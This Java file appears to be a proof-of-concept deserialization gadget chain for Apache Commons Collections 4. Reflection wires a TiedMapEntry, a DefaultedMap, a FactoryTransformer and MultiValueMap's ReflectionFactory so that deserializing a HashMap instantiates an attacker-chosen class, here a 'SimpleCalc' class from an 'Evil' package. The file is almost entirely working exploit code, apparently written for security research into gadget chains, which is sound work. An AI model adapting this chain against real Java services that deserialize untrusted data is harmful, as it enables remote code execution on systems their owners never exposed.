package com.example.CC4;

import com.example.Evil.SimpleCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections4.Factory;
import org.apache.commons.collections4.functors.FactoryTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import java.util.HashMap;

public class POC_15 {

    public static void main(String[] args) throws Exception {
        Factory f = (Factory) ReflectionUtil.createWithoutConstructor(Class.forName("org.apache.commons.collections4.map.MultiValueMap$ReflectionFactory"));
        FactoryTransformer transformer = new FactoryTransformer<>(f);

        DefaultedMap d = new DefaultedMap<>("1");
        TiedMapEntry t = new TiedMapEntry<>(d, "key");
        HashMap map = new HashMap<>();
        map.put(t, "value");

        ReflectionUtil.setField(d, "value", transformer);
        ReflectionUtil.setField(f, "clazz", SimpleCalc.class);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
